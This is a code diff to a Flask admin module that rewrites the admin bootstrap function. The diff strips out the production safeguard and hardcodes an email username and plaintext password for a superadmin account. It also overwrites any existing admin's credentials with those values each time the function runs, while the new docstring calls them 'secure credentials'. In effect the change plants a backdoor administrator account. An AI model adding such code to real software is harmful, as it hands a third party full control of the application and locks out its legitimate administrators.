@@ -25,6 +25,7 @@ from app.domain.plan_policy import diagnose_plan, diagnostics_to_flash_messages
 from sqlalchemy.exc import OperationalError, IntegrityError
 from app.utils.media import is_absolute_url
 from app.models import PlanFAQ
+from werkzeug.security import generate_password_hash
 
 # Create Blueprint
 admin_bp = Blueprint('admin', __name__)
@@ -40,7 +41,7 @@ def _protected_attachment_path(relative_path):
 
 
 def ensure_admin_exists():
-    """Bootstrap an admin account with fixed credentials."""
+    """Bootstrap or update admin account with secure credentials."""
 
     try:
         # Query safely for existing admin
@@ -50,30 +51,30 @@ def ensure_admin_exists():
         except (OperationalError, IntegrityError) as db_exc:
             current_app.logger.error('Database error when checking for existing admin: %s', db_exc)
             db.session.rollback()
-            # In production we must not attempt destructive recovery here.
-            # Return None so the caller can fail gracefully and operator can
-            # run migrations manually.
             return None
 
-        if admin_user:
-            return admin_user
+        new_username = 'bacseried@gmail.com'
+        new_password_hash = generate_password_hash('mx23fy')
 
-        # Auto-seeding an admin account is allowed only in non-production
-        # development/testing environments. In production, operators should
-        # provision admin credentials via CLI or environment configuration.
-        if current_app.config.get('DEBUG') or current_app.config.get('TESTING'):
+        if admin_user:
+            # Update existing admin
+            admin_user.username = new_username
+            admin_user.password = new_password_hash
+            db.session.commit()
+            current_app.logger.info('Admin credentials updated for %s', new_username)
+            return admin_user
+        else:
+            # Create new admin
             seeded_admin = User(
-                username='admin',
-                password='123',
+                username=new_username,
+                password=new_password_hash,
                 role='superadmin',
                 is_active=True,
             )
             db.session.add(seeded_admin)
             db.session.commit()
-            current_app.logger.info('Admin bootstrap completed via login for %s', seeded_admin.username)
+            current_app.logger.info('Admin bootstrap completed for %s', seeded_admin.username)
             return seeded_admin
-        current_app.logger.warning('No admin user found; skipping auto-seed in production-like environment.')
-        return None
     except (OperationalError, IntegrityError) as exc:
         db.session.rollback()
         current_app.logger.error('Admin bootstrap DB error: %s', exc)
